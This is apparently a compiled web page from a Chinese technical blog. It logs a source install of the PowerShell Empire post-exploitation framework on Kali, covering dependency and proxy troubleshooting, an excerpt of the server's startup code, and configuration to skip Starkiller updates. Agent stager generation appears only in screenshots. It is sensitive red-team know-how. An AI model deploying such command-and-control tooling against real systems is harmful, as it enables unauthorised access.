import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as p,o as l,c as o,a as n,d as s,b as a,e as t}from"./app-DxMJFouC.js";const c={},A=n("h1",{id:"powershell-empire",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#powershell-empire"},[n("span",null,"Powershell Empire")])],-1),r={href:"https://github.com/EmpireProject/Empire.git",target:"_blank",rel:"noopener noreferrer"},d={href:"https://www.kali.org/tools/powershell-empire/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.freebuf.com/sectool/158393.html",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.freebuf.com/articles/web/165925.html",target:"_blank",rel:"noopener noreferrer"},k={href:"https://github.com/EmpireProject/Empire",target:"_blank",rel:"noopener noreferrer"},v=n("code",null,"post-exploitation framework",-1),h=t(`<hr><ul><li><a href="#powershell-empire">Powershell Empire</a><ul><li><a href="#%E5%AE%89%E8%A3%85">安装</a><ul><li><a href="#github">Github</a><ul><li><a href="#1clone-%E4%BB%93%E5%BA%93%E6%9C%AC%E4%BD%93%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%9D%E8%B5%96%E4%BB%93%E5%BA%93">1.clone 仓库本体及相关依赖仓库</a></li><li><a href="#2-%E5%88%87%E5%88%B0%E7%A8%B3%E5%AE%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%AE%89%E8%A3%85">2. 切到稳定版本并安装</a></li><li><a href="#%E4%B8%8A%E7%BA%BF%E4%B8%AA%E6%9C%BA%E5%AD%90%E9%AA%8C%E4%B8%80%E4%B8%8B%E8%83%BD%E4%B8%8D%E8%83%BD%E7%94%A8">上线个机子验一下能不能用</a></li></ul></li><li><a href="#kali">Kali</a></li><li><a href="#demo">Demo</a><ul><li><a href="#%E6%8B%93%E6%89%91">拓扑</a></li><li><a href="#%E8%B5%B7-server">起 server</a></li><li><a href="#%E8%B5%B7-client">起 Client</a></li><li><a href="#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA-http-listener">新建一个 http listener</a></li><li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%BB%A5%E4%B8%8A%E7%BA%BF%E4%B8%BB%E6%9C%BA">执行命令以上线主机</a></li></ul></li></ul></li><li><a href="#starkiller">Starkiller</a></li><li><a href="#%E6%95%B4%E4%BD%93%E6%BA%90%E7%A0%81%E6%A6%82%E8%BF%B0">整体源码概述</a><ul><li><a href="#%E8%B0%83%E8%AF%95">调试</a></li><li><a href="#%E4%B8%BB%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3">主程序入口</a></li><li><a href="#listener">Listener</a></li></ul></li></ul></li></ul><hr><h2 id="安装" tabindex="-1"><a class="header-anchor" href="#安装"><span>安装</span></a></h2><h3 id="github" tabindex="-1"><a class="header-anchor" href="#github"><span>Github</span></a></h3><blockquote><p>PS: <code>main</code> 分支反映了最新更改，可能并不总是稳定的。克隆存储库后，可以通过运行 <code>setup/checkout-latest-tag.sh</code> 脚本签出最新的稳定版本。</p></blockquote><hr><h4 id="_1-clone-仓库本体及相关依赖仓库" tabindex="-1"><a class="header-anchor" href="#_1-clone-仓库本体及相关依赖仓库"><span>1.clone 仓库本体及相关依赖仓库</span></a></h4><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">git</span> clone <span class="token parameter variable">--recursive</span> https://github.com/BC-SECURITY/Empire.git
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041658684.png" alt="image-20230904165844577"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041703364.png" alt="image-20230904170344264"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041713348.png" alt="image-20230904171347281"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041718686.png" alt="image-20230904171831597"></p><p>上面的全是首次 clone 失败的 reference repo, 失败后会加入计划任务, 全 clone 一遍后会重新 clone 失败的仓库</p><p>如下即为重新 clone 成功了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041720336.png" alt="image-20230904172035940"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041721397.png" alt="image-20230904172111320"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041721828.png" alt="image-20230904172129685"></p><hr><h4 id="_2-切到稳定版本并安装" tabindex="-1"><a class="header-anchor" href="#_2-切到稳定版本并安装"><span>2. 切到稳定版本并安装</span></a></h4><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> Empire
./setup/checkout-latest-tag.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041747913.png" alt="image-20230904174753857"></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">sudo</span> ./setup/install.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041748553.png" alt="image-20230904174856396"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041749800.png" alt="image-20230904174921667"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041749975.png" alt="image-20230904174950726"></p><p>中间会有个提示要不要装 <code>xar</code> 和 <code>bomutils</code> 的选项需要手动输入选择一下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041750990.png" alt="image-20230904175022743"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041750178.png" alt="image-20230904175051016"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041751997.png" alt="image-20230904175115885"></p><p>解压了一堆包:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041753187.png" alt="image-20230904175330094"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041753859.png" alt="image-20230904175353728"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041754051.png" alt="image-20230904175428980"></p><p>然后开始</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041754737.png" alt="image-20230904175450645"></p><blockquote><p>这里由于网络原因超时了 ↑, 然后后面恢复了:</p></blockquote><p>然后应该是吧 xar 的目录列出来了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041756771.png" alt="image-20230904175613675"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041757186.png" alt="image-20230904175701068"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041757592.png" alt="image-20230904175720460"></p><p>然后提示了一堆需要 autoupdate:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041758733.png" alt="image-20230904175847634"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041759929.png" alt="image-20230904175914796"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041759009.png" alt="image-20230904175930869"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041759237.png" alt="image-20230904175952167"></p><hr><p>然后似乎是在拿 gcc 编译 libxml, 报了一堆 warning, 应该不用管</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041801620.png" alt="image-20230904180129483"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041802983.png" alt="image-20230904180201860"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041802398.png" alt="image-20230904180223245"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041803795.png" alt="image-20230904180306732"></p><hr><p>编译 <code>xar</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041803728.png" alt="image-20230904180354623"></p><hr><p>拉 <code>bomutils</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041804954.png" alt="image-20230904180442879"></p><hr><p>然后会询问要不要装 <code>openjdk</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041805669.png" alt="image-20230904180525602"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041806260.png" alt="image-20230904180647064"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041807467.png" alt="image-20230904180727351"></p><hr><p>装 C# agents 以及 modules</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041808478.png" alt="image-20230904180826346"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041808843.png" alt="image-20230904180844742"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041808376.png" alt="image-20230904180856309"></p><hr><p>询问要不要装 <code>MinGW</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041813243.png" alt="image-20230904181339135"></p><p>得, 又是网络问题, 打个快照先, 然后重跑一遍安装脚本:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041821847.png" alt="image-20230904182144749"></p><p>又是 xar</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041822292.png" alt="image-20230904182221225"></p><p>下面一堆目录和 warning 就不截图了, 然后接着是 OpenJDK:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041823723.png" alt="image-20230904182326472"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041824057.png" alt="image-20230904182424979"></p><p>然后是 <code>MinGW</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041849047.png" alt="image-20230904184908942"></p><p>最后又 package not found, enmmmmmm, 再重装一次吧:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041856976.png" alt="image-20230904185602899"></p><blockquote><p>得, 总是网络问题, 挂个代理再试一次吧...</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051044209.png" alt="image-20230905104400091"></p><p>看样子是成功了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051054607.png" alt="image-20230905105430483"></p><hr><p>然后是检查 python 版本:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051055020.png" alt="image-20230905105540909"></p><hr><p>然后是装一些包, 不过似乎全失败了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051056310.png" alt="image-20230905105623145"></p><p>也许和代理有关系, 把代理下掉试试:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051056330.png" alt="image-20230905105656210"></p><p>依旧不行:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051057057.png" alt="image-20230905105742903"></p><p>记录一下失败的日志:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051104393.png" alt="image-20230905110450222"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051107539.png" alt="image-20230905110742437"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051108491.png" alt="image-20230905110826373"></p><p>可以看到安装失败的包有:</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>pycparser
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,102),b={href:"https://github.com/eliben/pycparser",target:"_blank",rel:"noopener noreferrer"},B=t(`<p>手动装一下试试:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>pip <span class="token function">install</span> pycparser
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051115309.png" alt="image-20230905111518207"></p><p>手动装显示装好了, 不过重新运行脚本依旧会出错:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051135044.png" alt="image-20230905113545960"></p><p>按照 <code>DUBusErrorResponse</code> 作为关键词进行检索, 似乎是 <code>poetry</code> 的问题</p>`,6),y={href:"https://github.com/HibiKier/zhenxun_bot/issues/1217",target:"_blank",rel:"noopener noreferrer"},Q={href:"https://stackoverflow.com/questions/75080993/dbuserrorresponse-while-running-poetry-install",target:"_blank",rel:"noopener noreferrer"},w=n("p",null,"尝试直接 poetry add 看看:",-1),E=n("p",null,[n("img",{src:"http://cdn.ayusummer233.top/DailyNotes/202309051339232.png",alt:"image-20230905133944148"})],-1),G=n("p",null,"检索该报错找到了如下信息:",-1),D={href:"https://github.com/python-poetry/poetry/issues/3012",target:"_blank",rel:"noopener noreferrer"},C={href:"https://github.com/python-poetry/poetry/issues/2692",target:"_blank",rel:"noopener noreferrer"},f={href:"https://blog.frank-mich.com/python-poetry-1-0-0-private-repo-issue-fix/",target:"_blank",rel:"noopener noreferrer"},N=t(`<p>两个报错最终都指向了 kering, 且都提到了同一种解决方案:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable">PYTHON_KEYRING_BACKEND</span><span class="token operator">=</span>keyring.backends.null.Keyring
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051348555.png" alt="image-20230905134854510"></p><p>再重新跑一遍安装脚本试试:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051349340.png" alt="image-20230905134918277"></p><p>终于开始正常运行了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051351591.png" alt="image-20230905135131176"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051352600.png" alt="image-20230905135218509"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051352295.png" alt="image-20230905135243218"></p><p>终于成功装完了, 根据最后的提示重新加载下配置文件来启用 <code>nim</code></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">source</span> ~/.bashrc
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051355203.png" alt="image-20230905135507151"></p><blockquote><p>这里又反复确认了下项目所在的 kali 用户目录以及 root 用户的 <code>.bashrc</code> 中的配置是否都能成功加载完成, 因为我不能确定到底是把配置写在那个用户下了, 个人认为应该是当前命令行的 root 用户, 翻了下两个文件, 确实是在 root 下面:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051357723.png" alt="image-20230905135726625"></p></blockquote>`,13),_={href:"https://zh.wikipedia.org/wiki/Nim",target:"_blank",rel:"noopener noreferrer"},H=n("strong",null,"Nim",-1),U={href:"https://zh.wikipedia.org/wiki/%E6%8C%87%E4%BB%A4%E5%BC%8F%E7%B7%A8%E7%A8%8B",target:"_blank",rel:"noopener noreferrer"},x={href:"https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80",target:"_blank",rel:"noopener noreferrer"},F={href:"https://zh.wikipedia.org/wiki/%E5%A4%9A%E9%87%8D%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8F",target:"_blank",rel:"noopener noreferrer"},S={href:"https://zh.wikipedia.org/wiki/%E9%9D%99%E6%80%81%E7%B1%BB%E5%9E%8B",target:"_blank",rel:"noopener noreferrer"},q={href:"https://zh.wikipedia.org/wiki/%E7%B7%A8%E8%AD%AF%E8%AA%9E%E8%A8%80",target:"_blank",rel:"noopener noreferrer"},$={href:"https://zh.wikipedia.org/wiki/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80",target:"_blank",rel:"noopener noreferrer"},M={href:"https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80",target:"_blank",rel:"noopener noreferrer"},Y={href:"https://zh.wikipedia.org/wiki/Python",target:"_blank",rel:"noopener noreferrer"},I={href:"https://zh.wikipedia.org/wiki/Lisp",target:"_blank",rel:"noopener noreferrer"},P=t(`<hr><p>接下来起一下 server client 试试</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051409613.png" alt="image-20230905140935515"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051409165.png" alt="image-20230905140954014"></p><p>又有报错, 不管是包还是网络, 先解决第一个问题:</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>[ERROR]: advanced_reporting failed to initialize: No module named &#39;stix2&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>看了下这是 python 的一个包, 尝试拿 poetry 装一下这个库:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051427204.png" alt="image-20230905142742025"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051428927.png" alt="image-20230905142804783"></p><p>看样子还是能成功装上的, 再起一遍 server 试试</p><blockquote><p>由于前面还看到下载失败啥的, 所以还是先挂下代理(</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051430365.png" alt="image-20230905143045296"></p><p>看样子似乎是正常启动了</p><hr><p>再起一下 client:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051431331.png" alt="image-20230905143144250"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051431951.png" alt="image-20230905143159838"></p><hr><p>总算是成功通过源码装好了, 嫌费劲的话还是直接 apt 装就行了:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> powershell-empire
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h4 id="上线个机子验一下能不能用" tabindex="-1"><a class="header-anchor" href="#上线个机子验一下能不能用"><span>上线个机子验一下能不能用</span></a></h4><p>具体步骤可以参阅下面的 <a href="#Demo">Demo 章节</a></p><p>在生成上线命令时报错了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051548904.png" alt="image-20230905154807411"></p>`,25),L={href:"https://pyperclip.readthedocs.io/en/latest/index.html#not-implemented-error",target:"_blank",rel:"noopener noreferrer"},Z=t(`<p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051552656.png" alt="image-20230905155244575"></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> xsel <span class="token comment"># to install the xsel utility.</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> xclip <span class="token comment"># to install the xclip utility.</span>
pip <span class="token function">install</span> gtk <span class="token comment"># to install the gtk Python module.</span>
pip <span class="token function">install</span> PyQt4 <span class="token comment"># to install the PyQt4 Python module.</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>相应的进行处理</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">apt</span> <span class="token function">install</span> xsel
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051552537.png" alt="image-20230905155233450"></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">apt</span> <span class="token function">install</span> xclip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051553222.png" alt="image-20230905155311091"></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 如下步骤操作后发现是不需要的</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">PYTHON_KEYRING_BACKEND</span><span class="token operator">=</span>keyring.backends.null.Keyring
poetry <span class="token function">add</span> gtk
poetry <span class="token function">add</span> PyQt4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051558148.png" alt="image-20230905155839004"></p><p>看到这里报错没找到就去翻了下为什么, 然后发现 gtk py 包的全名是 pygtk, 而且只支持 python2, 而 pyqt 已经出到 6 了, 感觉也和剪贴板没啥关系, 就不装了</p><p>再试一下生成上线命令发现还是一样的报错, 猜测可能是没加载到啥配置之类的, 重启了下主机</p><p>重启完主机后起 server 的时候发现连不上数据库, 还需要手动启动下 mysql</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051618898.png" alt="image-20230905161835804"></p><p>以及需要等 Starkiller 启动才能起 client, 否则会连不上</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051622312.png" alt="image-20230905162249249"></p><p>这就比较头疼了, 要拉更新, 太慢了, 挂下代理吧</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span>http://127.0.0.1:7890
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后就能成功运行了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051624297.png" alt="image-20230905162416231"></p><p>不过这个代理感觉可能会影响部分功能, 下掉再重启试试:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">unset</span> https_proxy
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051626227.png" alt="image-20230905162619135"></p><p>成功起来了, 不过感觉总是这样的话并不是个好办法, 看看有没有啥参数能跳过 Starkiller 更新, 循着 <code>./ps-empire</code> 一步步找找:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051628355.png" alt="image-20230905162810317"></p><p>指向 <code>empire.py</code> 主程序:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051628833.png" alt="image-20230905162835778"></p><p>调用了 <code>empire.empire.server.run(args)</code> 来启动 server</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051638650.png" alt="image-20230905163816595"></p><p>函数全文如下:</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    setup_logging<span class="token punctuation">(</span>args<span class="token punctuation">)</span>
    check_submodules<span class="token punctuation">(</span><span class="token punctuation">)</span>
    check_recommended_configuration<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>restport<span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restport <span class="token operator">=</span> <span class="token number">1337</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restport <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>restport<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>restip<span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restip <span class="token operator">=</span> <span class="token string">&quot;0.0.0.0&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restip <span class="token operator">=</span> args<span class="token punctuation">.</span>restip<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>version<span class="token punctuation">:</span>
        <span class="token comment"># log to stdout instead of stderr</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>empire<span class="token punctuation">.</span>VERSION<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>reset<span class="token punctuation">:</span>
        choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>
            <span class="token string">&quot;\\x1b[1;33m[&gt;] Would you like to reset your Empire Server instance? [y/N]: \\x1b[0m&quot;</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">if</span> choice<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;y&quot;</span><span class="token punctuation">:</span>
            reset<span class="token punctuation">(</span><span class="token punctuation">)</span>

        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        base<span class="token punctuation">.</span>startup_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">global</span> main

        <span class="token comment"># Calling run more than once, such as in the test suite</span>
        <span class="token comment"># Will generate more instances of MainMenu, which then</span>
        <span class="token comment"># causes shutdown failure.</span>
        <span class="token keyword">if</span> main <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            main <span class="token operator">=</span> empire<span class="token punctuation">.</span>MainMenu<span class="token punctuation">(</span>args<span class="token operator">=</span>args<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">&quot;./empire/server/data/empire-chain.pem&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&quot;Certificate not found. Generating...&quot;</span><span class="token punctuation">)</span>
            subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&quot;./setup/cert.sh&quot;</span><span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

        <span class="token keyword">from</span> empire<span class="token punctuation">.</span>server<span class="token punctuation">.</span>api <span class="token keyword">import</span> app

        app<span class="token punctuation">.</span>initialize<span class="token punctuation">(</span>secure<span class="token operator">=</span>args<span class="token punctuation">.</span>secure_api<span class="token punctuation">,</span> ip<span class="token operator">=</span>args<span class="token punctuation">.</span>restip<span class="token punctuation">,</span> port<span class="token operator">=</span>args<span class="token punctuation">.</span>restport<span class="token punctuation">)</span>

    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可惜的是没有参数能控制是否更新 Starkiller, 继续向下看 <code>app.initialize</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051642808.png" alt="image-20230905164224683"></p><p>根据 log 信息与代码定位到更新 Starkiller 的代码在 <code>sync_starkiller</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051645388.png" alt="image-20230905164524327"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051646302.png" alt="image-20230905164650213"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051647016.png" alt="image-20230905164728960"></p><p>找到了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051654486.png" alt="image-20230905165429386"></p><p>配置在调用 sync_starkiller 传入了, 在捋一下来源找到了如下文件：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051655641.png" alt="image-20230905165556526"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051655103.png" alt="image-20230905165527997"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051656229.png" alt="image-20230905165648165"></p><p>看样子还是可以传入参配置文件控制的, 默认的配置在这里:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051710319.png" alt="image-20230905171036243"></p><p>如果要自定义的话可以拷贝一份默认配置, 例如:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051722888.png" alt="image-20230905172215794"></p><p>这样就不用更新了, 不过直接改默认配置更方便, 之后需要更新的时候可以再改回来</p><hr><p>然后在 client 端成功生成了上线命令:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051816388.png" alt="image-20230905181654321"></p><p>可以看到能成功复制了</p><blockquote><p>不过后续使用的时候发现有时又不能复制了, 又是一样的报错, 感觉有可能是因为我 ssh 连上去之后拷贝要跨机子所以报错了? 不过反正也不影响, 直接手动拷贝也可以</p></blockquote><hr><p>上线个机子试试:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309052158989.png" alt="image-20230905215617525"></p><hr><h3 id="kali" tabindex="-1"><a class="header-anchor" href="#kali"><span>Kali</span></a></h3><p>Kali 上可以直接通过 <code>apt</code> 安装 <code>powershell-empire</code></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> powershell-empire
